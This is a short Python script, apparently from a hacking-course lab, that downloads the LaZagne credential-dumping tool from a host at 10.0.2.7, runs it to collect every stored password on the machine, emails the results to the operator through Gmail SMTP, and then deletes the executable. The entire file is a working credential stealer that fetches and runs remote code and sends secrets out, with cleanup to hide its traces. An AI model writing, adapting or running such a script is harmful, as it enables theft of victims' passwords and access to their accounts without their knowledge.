#!/usr/bin/env python
#This program downloads a file, executes it and sends a 
#report via email


import requests,subprocess,smtplib,os,tempfile, optparse

def get_arguments():
    parser = optparse.OptionParser()

    parser.add_option("-e", "--email", dest="email", help="Email address")
    parser.add_option("-p", "--password", dest="pwd", help="Email's password")

    options,arguments = parser.parse_args()

    if not options.email:
        parser.error("[-] Please specify an email address to send the report to.")
    if not options.pwd:
        parser.error("[-] Please specify the email's password.")

    return options


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    #wb mode for writing a binary file
    with open(file_name, "wb") as file:
        file.write(get_response.content)

def send_mail(email, password, message):
    smtp_server = smtplib.SMTP("smtp.gmail.com",587)
    smtp_server.starttls()
    smtp_server.login(email,password)
    smtp_server.sendmail(email, email, message)
    smtp_server.quit()


options = get_arguments()
temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)

download("http://10.0.2.7/evil-files/laZagne.exe")
command = "laZagne.exe all"
result = subprocess.check_output(command, shell=True)
send_mail(options.email,options.pwd,result)
os.remove("laZagne.exe")